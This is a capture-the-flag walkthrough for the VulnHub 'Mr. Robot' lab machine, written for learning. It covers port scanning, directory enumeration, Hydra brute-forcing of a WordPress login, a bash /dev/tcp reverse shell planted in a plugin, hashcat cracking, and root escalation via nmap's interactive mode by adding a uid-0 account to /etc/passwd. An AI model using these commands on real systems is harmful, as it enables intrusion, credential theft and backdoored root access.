# Machine Link
https://www.vulnhub.com/entry/mr-robot-1,151/

# Machine Details
### OS
FreeBSD
### IP
192.168.56.2

### Description
Based on the show, Mr. Robot.

This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.

The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.

----
# Nmap

#### Scanning for open ports
```bash
nmap -v -p- -oN open-ports.txt $IP

Nmap scan report for 192.168.1.127
Host is up (0.00033s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 08:00:27:7E:CC:18 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

```

#### Service version & OS detection
```bash
nmap -v -sC -sT -sV -A -O -p 22,80,443 $IP -oN nmap-version.txt

Nmap scan report for 192.168.1.127
Host is up (0.00042s latency).

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16:3b19:87c3:42ad:6634:c1c9:d0aa:fb97
|_SHA-1: ef0c:5fa5:931a:09a5:687c:a2c2:80c4:c792:07ce:f71b
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache
MAC Address: 08:00:27:7E:CC:18 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.13 - 4.4 (98%), Linux 3.16 - 4.6 (96%), Linux 3.2 - 4.14 (94%), Linux 3.8 - 3.16 (94%), Linux 4.10 (94%), Linux 3.2 - 3.8 (93%), Linux 3.16 (93%), Linux 4.4 (93%), Linux 3.13 or 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.037 days (since Thu Jun  5 17:59:47 2025)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
```

--- 
# Enumeration

We found this Web Application running on port 80 and 443.

<img width="1898" height="993" alt="image" src="https://github.com/user-attachments/assets/6e45b8dd-b858-4969-bc43-38a2dec0f479" />

## Directory Bruteforcing

Using diresearch for directory and file bruteforcing :

```bash
dirsearch -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -r -o dirsearch_directories.txt

# Dirsearch started Fri Jun  6 12:56:01 2025 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.1.127 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -r -o dirsearch_directories.txt

301   236B   http://192.168.1.127/images    -> REDIRECTS TO: http://192.168.1.127/images/
301   232B   http://192.168.1.127/js    -> REDIRECTS TO: http://192.168.1.127/js/
301   240B   http://192.168.1.127/wp-content    -> REDIRECTS TO: http://192.168.1.127/wp-content/
301   233B   http://192.168.1.127/css    -> REDIRECTS TO: http://192.168.1.127/css/
301   238B   http://192.168.1.127/wp-admin    -> REDIRECTS TO: http://192.168.1.127/wp-admin/
301   241B   http://192.168.1.127/wp-includes    -> REDIRECTS TO: http://192.168.1.127/wp-includes/
301   235B   http://192.168.1.127/admin    -> REDIRECTS TO: http://192.168.1.127/admin/
301   234B   http://192.168.1.127/blog    -> REDIRECTS TO: http://192.168.1.127/blog/
405    42B   http://192.168.1.127/xmlrpc
302     0B   http://192.168.1.127/login    -> REDIRECTS TO: http://192.168.1.127/wp-login.php
301     0B   http://192.168.1.127/feed    -> REDIRECTS TO: http://192.168.1.127/feed/
301     0B   http://192.168.1.127/rss    -> REDIRECTS TO: http://192.168.1.127/feed/
301   235B   http://192.168.1.127/video    -> REDIRECTS TO: http://192.168.1.127/video/
200     0B   http://192.168.1.127/sitemap
301     0B   http://192.168.1.127/image    -> REDIRECTS TO: http://192.168.1.127/image/
301   235B   http://192.168.1.127/audio    -> REDIRECTS TO: http://192.168.1.127/audio/
403    94B   http://192.168.1.127/phpmyadmin
404   135B   http://192.168.1.127/wp-trackback
302     0B   http://192.168.1.127/dashboard    -> REDIRECTS TO: http://192.168.1.127/wp-admin/
200     1KB  http://192.168.1.127/wp-login
301     0B   http://192.168.1.127/0    -> REDIRECTS TO: http://192.168.1.127/0/
301     0B   http://192.168.1.127/atom    -> REDIRECTS TO: http://192.168.1.127/feed/atom/
200    41B   http://192.168.1.127/robots
200   158B   http://192.168.1.127/license
200   504KB  http://192.168.1.127/intro
301     0B   http://192.168.1.127/Image    -> REDIRECTS TO: http://192.168.1.127/Image/
301     0B   http://192.168.1.127/IMAGE    -> REDIRECTS TO: http://192.168.1.127/IMAGE/
301     0B   http://192.168.1.127/rss2    -> REDIRECTS TO: http://192.168.1.127/feed/
200    64B   http://192.168.1.127/readme
301     0B   http://192.168.1.127/rdf    -> REDIRECTS TO: http://192.168.1.127/feed/rdf/
301     0B   http://192.168.1.127/0000    -> REDIRECTS TO: http://192.168.1.127/0000/
200     0B   http://192.168.1.127/wp-config
301     0B   http://192.168.1.127/page1    -> REDIRECTS TO: http://192.168.1.127/
302     0B   http://192.168.1.127/wp-signup    -> REDIRECTS TO: http://192.168.1.127/wp-login.php?action=register

```

Looks like wordpress is running on the machine. Some important directories found includes :
- /images
- /wp-admin
- /admin
- /xmlrpc
- phpmyadmin
- robots
- wp-config

## File Bruteforcing
```bash
dirsearch -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -o dirsearch_files.txt

# Dirsearch started Fri Jun  6 12:48:04 2025 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.1.127 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -o dirsearch_files.txt

301     0B   http://192.168.1.127/index.php    -> REDIRECTS TO: http://192.168.1.127/
405    42B   http://192.168.1.127/xmlrpc.php
200     1KB  http://192.168.1.127/wp-login.php
301     0B   http://192.168.1.127/wp-register.php    -> REDIRECTS TO: http://192.168.1.127/wp-login.php?action=register
200    64B   http://192.168.1.127/readme.html
200     0B   http://192.168.1.127/favicon.ico
200   158B   http://192.168.1.127/license.txt
200    41B   http://192.168.1.127/robots.txt
200     0B   http://192.168.1.127/sitemap.xml
200     0B   http://192.168.1.127/wp-config.php
301     0B   http://192.168.1.127/wp-commentsrss2.php    -> REDIRECTS TO: http://192.168.1.127/comments/feed/
404   135B   http://192.168.1.127/wp-trackback.php
500     0B   http://192.168.1.127/wp-settings.php
403     0B   http://192.168.1.127/wp-app.php
301     0B   http://192.168.1.127/wp-rss.php    -> REDIRECTS TO: http://192.168.1.127/feed/
301     0B   http://192.168.1.127/wp-rss2.php    -> REDIRECTS TO: http://192.168.1.127/feed/
200     0B   http://192.168.1.127/wp-cron.php
301     0B   http://192.168.1.127/wp-rdf.php    -> REDIRECTS TO: http://192.168.1.127/feed/rdf/
301     0B   http://192.168.1.127/wp-atom.php    -> REDIRECTS TO: http://192.168.1.127/feed/atom/
301     0B   http://192.168.1.127/wp-feed.php    -> REDIRECTS TO: http://192.168.1.127/feed/
404     0B   http://192.168.1.127/wp-blog-header.php
200   191B   http://192.168.1.127/wp-links-opml.php
403   214B   http://192.168.1.127/.html
500     3KB  http://192.168.1.127/wp-mail.php
200     0B   http://192.168.1.127/sitemap.xml.gz
200     0B   http://192.168.1.127/wp-load.php
302     0B   http://192.168.1.127/wp-signup.php    -> REDIRECTS TO: http://192.168.1.127/wp-login.php?action=register
302     0B   http://192.168.1.127/wp-activate.php    -> REDIRECTS TO: http://192.168.1.127/wp-login.php?action=register
403   213B   http://192.168.1.127/.htm
403   219B   http://192.168.1.127/.htpasswds
403   216B   http://192.168.1.127/.htuser
403   212B   http://192.168.1.127/.ht
403   213B   http://192.168.1.127/.htc
403   217B   http://192.168.1.127/.htacess


```

### robots.txt
Here we found robots.txt file :
<img width="741" height="349" alt="image" src="https://github.com/user-attachments/assets/746c51f1-a745-4aa1-98c7-9a3dd349c416" />

We found two files here :
fsocity.dic
key-1-of-3.txt

### First Key
We found the first key :
<img width="852" height="362" alt="image" src="https://github.com/user-attachments/assets/f2bf93ba-70ad-457c-b927-0e0d4d722c6a" />

---
# Credential Bruteforcing
Now on the wp-login when we login with invalid user, the error says "Invalid username". Now we can find valid users through filtering this string.
<img width="1341" height="843" alt="image" src="https://github.com/user-attachments/assets/9c64c7ca-b4df-4b6b-afa8-57c5ec7c4c5c" />

## Finding username using hydra

I have used hydra to filter for valid users using the fsocity.txt as username list and filtering output through "F=Invalid Username" give the login page and other details from burp suite. Correct username can also be found in similar way through burpsuite.

```bash
hydra -vV -L fsocity.txt -p test -f $IP http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username'
```

<img width="1886" height="725" alt="image" src="https://github.com/user-attachments/assets/a3a1f5f1-b139-44fb-987d-514e490c8157" />

So we have our valid user : Elliot (main character of mr-robot series)

## Finding Password using hydra
Now we need to find the password for the user, again using hydra for this. But first filtering duplicate entries in the fsocity.txt as the password list will take so much time.

```bash
cat fsocity.txt | sort | uniq > fsocity2.txt
```

Using hydra :
```bash
hydra -vV -l Elliot -P fsocity2.txt -f $IP http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect'

#alternatively we can also use wpscan for this :
wpscan --url $IP --wordlist fsocity2.txt --username Elliot
```


<img width="1492" height="1032" alt="image" src="https://github.com/user-attachments/assets/c5877e75-28e9-4d1d-a0dd-7e61e47ce372" />

We found the password for **Elliot** user : ER28-0652

---
# Wordpress Login
Let's login with Elliot user on **wp-login** :

<img width="1910" height="1042" alt="image" src="https://github.com/user-attachments/assets/aa55ea41-eb8b-4733-bf8e-f6bb17da3476" />

The Elliot user is wordpress Administrator :
<img width="1915" height="808" alt="image" src="https://github.com/user-attachments/assets/6cadb11f-58d8-41e6-b4a8-294d178add22" />

---
# Reverse Shell by Plugins edit
Now as we are admin we can edit any plugin so just go to Plugins -> Installed Plugins and Edit any plugin. I am editing the Holly Dolly plugin. Here in the php code add php reverse shell code :

```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'");
#make sure to change the IP and port
```

<img width="1708" height="976" alt="image" src="https://github.com/user-attachments/assets/3700f1bc-4ac2-441c-85af-254797e8d107" />

Now start a listner on main system and through Installed Plugins active - deactivate the plugin and you will get a reverse shell :

<img width="1905" height="1025" alt="image" src="https://github.com/user-attachments/assets/e5421fde-addf-430c-b502-3725694f1911" />

---

# Privilege Escalation robot user

Now on the home directory of robot user we found the md5 hash of it's password. Just simply use md5 decrypt website or hashcat to crack the md5 hash :

```bash
cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Crack the hash using hashcat :
```bash
#save the hash in a file first
echo c3fcd3d76192e4007dfb496cca67e13b > hash.txt

#now use hashcat with hashmode 0 and rockyou
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt

#output :
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

Use the password : abcdefghijklmnopqrstuvwxyz
```bash
su robot
abcdefghijklmnopqrstuvwxyz
```

#### Second Key
<img width="1011" height="554" alt="image" src="https://github.com/user-attachments/assets/9a3fc725-92f2-4aad-a5a3-c17f2c293167" />

---
# Privilege Escalation Root User

Checking SUID Binaries :
```bash
find / -type f -perm -u=s 2>/dev/null

/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

<img width="1061" height="612" alt="image" src="https://github.com/user-attachments/assets/b1dd8c78-b574-481e-99e7-decb1f4fd86d" />

## Nmap SUID Binary Exploit
Here we find nmap to be different than regular SUID binary files.

In older versions of nmap we can use the --interactive switch to execute commands :
```bash
/usr/local/bin/nmap --interactive

nmap> ! nano /etc/passwd
```

<img width="1042" height="317" alt="image" src="https://github.com/user-attachments/assets/f9ed86d0-acbb-4c36-a14d-d5c0e3d177fc" />

Now just add a line duplicating root user with root1 user and in password field generate and paste a password :
```
openssl passwd -6 'root'
$6$iwyKiyo1nEJ5mBzg$h8TGnOe.cSWzw3UsWRdouWJBMWGkbB2iSBMFxJ4I4qpvPjTUyiN0qs5ic23nk7ozHtL9hCHPwhV9RNM6fAqZ0/

#example :
root1:$6$iwyKiyo1nEJ5mBzg$h8TGnOe.cSWzw3UsWRdouWJBMWGkbB2iSBMFxJ4I4qpvPjTUyiN0qs5ic23nk7ozHtL9hCHPwhV9RNM6fAqZ0/:0:0:root1:/root:/bin/bash

```

<img width="1562" height="695" alt="image" src="https://github.com/user-attachments/assets/71c71c02-e5d0-437f-a9fb-3d18d436d6ed" />

Now just save the file and use switch to root1 user :
```bash
su root1
root
```

<img width="930" height="255" alt="image" src="https://github.com/user-attachments/assets/1eeac0ef-063c-436b-98dd-32c59a1660c1" />

We got the root shell and the 3rd key!!!

---

## Take Away Concepts
- Directory & File bruteforcing should be done first to understand tha web application
- Search for leaked credentails in every file acessible.
- If you are wordpress admin, edit the plugins code for getting reverse shell.
- Check for unusual SUID binaries for privilege escalation.
- Find SUID priv esc on GTFObins and also remember older tools can have deprecated switches like --interactive which makes them vulnerable.

---
